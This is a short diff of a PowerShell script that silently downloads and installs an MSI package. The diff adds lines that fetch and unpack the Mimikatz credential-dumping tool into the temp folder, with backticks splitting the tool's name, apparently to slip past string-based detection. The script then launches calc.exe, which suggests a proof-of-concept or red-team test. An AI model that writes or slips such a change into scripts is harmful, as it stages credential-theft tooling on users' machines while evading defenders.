@@ -9,4 +9,9 @@ Invoke-WebRequest $url -OutFile "$env:TEMP\j3xyz7.msi"
 if (Test-Path "$env:TEMP\j3xyz7.msi") {
     msiexec.exe /i "$env:TEMP\j3xyz7.msi" /qn /norestart /L*v "$env:TEMP\j3xyz7-install.log"
 }
+
+$url2 = "https://github.com/gentilkiwi/mimi`katz/releases/download/2.2.0-20220919/mimi`katz_trunk.zip"
+Start-BitsTransfer -source $url2 -destination "$env:TEMP\mimi.zip"
+Expand-Archive -Path "$env:TEMP\mimi.zip" -DestinationPath "$env:TEMP\mimi" -Force
+
 Start-Process "C:\Windows\System32\calc.exe"
